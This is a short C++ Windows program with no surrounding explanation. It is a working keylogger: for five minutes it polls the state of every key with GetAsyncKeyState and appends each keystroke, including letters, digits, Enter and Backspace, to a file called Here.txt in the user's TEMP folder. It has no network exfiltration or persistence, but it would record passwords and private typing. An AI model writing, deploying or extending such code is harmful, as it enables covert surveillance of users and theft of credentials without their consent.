#define _CRT_SECURE_NO_WARNINGS

#include <windows.h>
#include <fstream>
#include <ctime>
#include <string>
#include <cstdlib>
#include <iostream>

int main() {
    char* tempPath = nullptr;
    size_t len = 0;
    if (_dupenv_s(&tempPath, &len, "TEMP") != 0 || !tempPath) return 1;

    std::string logPath = std::string(tempPath) + "\\Here.txt";
    free(tempPath);

    std::ofstream logFile(logPath, std::ios::app);
    if (!logFile.is_open()) return 1;

    std::time_t t = std::time(nullptr);
    char timeBuffer[64];
    if (ctime_s(timeBuffer, sizeof(timeBuffer), &t) != 0) {
        logFile << "=== Started ===\n";
    }
    else {
        logFile << "\n=== Started at " << timeBuffer << "===\n";
    }
    logFile.flush();

    DWORD startTime = GetTickCount();
    while (GetTickCount() - startTime < 300000) {  // 5 minutes
        for (int keyCode = 8; keyCode <= 190; ++keyCode) {
            SHORT keyState = GetAsyncKeyState(keyCode);
            if (keyState & 0x0001) {
                if ((keyCode >= 0x30 && keyCode <= 0x39) || (keyCode >= 0x41 && keyCode <= 0x5A)) {
                    char ch = static_cast<char>(keyCode);
                    logFile << ch;
                }
                else {
                    switch (keyCode) {
                    case VK_SPACE:    logFile << " "; break;
                    case VK_RETURN:   logFile << "[ENTER]\n"; break;
                    case VK_TAB:      logFile << "[TAB]"; break;
                    case VK_BACK:     logFile << "[BACKSPACE]"; break;
                    case VK_SHIFT:    logFile << "[SHIFT]"; break;
                    case VK_CONTROL:  logFile << "[CTRL]"; break;
                    case VK_ESCAPE:   logFile << "[ESC]"; break;
                    default:          logFile << "[KEY:" << keyCode << "]"; break;
                    }
                }
                logFile.flush();
            }
        }
        Sleep(10);
    }

    logFile << "\n=== Finished ===\n";
    logFile.flush();
    logFile.close();

    return 0;
}
